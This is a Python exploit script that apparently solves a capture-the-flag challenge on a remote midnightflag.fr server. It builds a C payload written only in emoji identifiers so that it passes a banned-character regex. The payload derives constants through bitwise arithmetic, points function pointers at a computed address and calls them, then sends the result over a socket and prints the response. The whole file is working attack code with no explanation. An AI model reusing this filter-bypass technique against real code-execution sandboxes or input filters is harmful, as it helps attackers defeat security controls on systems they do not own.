import re
import socket


def e(code):
    return chr(int(code, 16))


def build_probe_payload():
    z = e("1F63A")
    buf = e("1F63B")
    s0 = e("1F63C")
    sx = e("1F63D")
    arr = e("1F64A")

    a1 = e("1F63E")
    a2 = e("1F63F")
    a3 = e("1F640")

    c1 = e("1F641")
    c2 = e("1F642")
    c4 = e("1F643")
    c8 = e("1F609")
    c32 = e("1F607")
    c47 = e("1F619")
    c7 = e("1F61A")

    p = e("1F61C")
    p21 = e("1F61B")
    p23 = e("1F61D")
    ten = e("1F61E")
    neg = e("1F61F")
    addr = e("1F620")

    entry = e("1F600")

    parts = []
    parts += [
        f"{z};",
        f"*{buf};",
        f"(*{s0})();",
        f"(*{sx})({a1},{a2},{a3});",
        f"{arr}[]={{}};",
        f"{c1};{c2};{c4};{c8};{c32};{c47};{c7};",
        f"{p};{p21};{p23};{ten};{neg};{addr};",
    ]

    parts += [f"{entry}(){{"]
    parts += [f"{c1}=~(~{z}+~{z});"]
    parts += [f"{c2}={c1}+{c1};"]
    parts += [f"{c4}={c2}+{c2};"]
    parts += [f"{c8}={c4}+{c4};"]
    parts += [f"{c32}={c8}+{c8}+{c8}+{c8};"]
    parts += [f"{c47}={c32}+{c8}+{c4}+{c2}+{c1};"]
    parts += [f"{c7}={c4}+{c2}+{c1};"]

    parts += [f"{p}={c1};"]
    for i in range(2, 24):
        parts += [f"{p}={p}+{p};"]
        if i == 21:
            parts += [f"{p21}={p};"]
        if i == 23:
            parts += [f"{p23}={p};"]

    parts += [f"{ten}={p23}+{p21};"]
    parts += [f"{neg}=~({ten}+~{z});"]
    parts += [f"{addr}={neg}+{c7};"]
    parts += [f"{s0}={addr};{sx}={addr};"]

    parts += [f"{buf}={arr};*{buf}={c47};"]
    parts += [f"(*{s0})({z},{arr},{c1});"]
    parts += [f"(*{sx})({c1},{arr},{c1});"]
    parts += ["}"]

    return "".join(parts)


def main():
    payload = build_probe_payload()
    ban = re.compile(r"[\w\s_?&!|$'\"<>^:/^/-]")
    print("payload_len", len(payload))
    print("regex_ok", ban.search(payload) is None)

    s = socket.create_connection(("dyn-01.midnightflag.fr", 12780), timeout=20)
    s.settimeout(60)
    print(s.recv(4096).decode("utf-8", "ignore"), end="")

    s.sendall(payload.encode("utf-8") + b"\n" + b"Z" * 16)
    s.shutdown(socket.SHUT_WR)

    out = b""
    while True:
        try:
            chunk = s.recv(8192)
            if not chunk:
                break
            out += chunk
        except Exception:
            break
    s.close()

    print("output_len", len(out))
    print("raw_tail", repr(out[-160:]))
    print(out.decode("utf-8", "ignore"))


if __name__ == "__main__":
    main()
